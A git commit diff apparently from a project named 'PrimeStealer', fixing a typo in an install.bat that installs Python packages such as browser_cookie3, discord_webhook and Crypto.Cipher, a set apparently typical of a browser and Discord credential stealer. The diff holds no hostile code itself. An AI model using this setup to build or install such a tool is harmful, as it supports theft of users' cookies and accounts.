9d1dfba042f0ccf7db09c7a8d1cb4caf59b6e429
PrimeStealer <113944799+SheLuvDx@users.noreply.github.com>
2024-03-09 13:06:57 -0600

    Update install.bat

--- install.bat
+++ install.bat
@@ -12,6 +12,6 @@ pip install psutil
 pip install ctypes
 pip install Crypto.Cipher
 pip install fade
-pip install discor
+pip install discord
 pip install browser_cookie3
 pip install discord_webhook
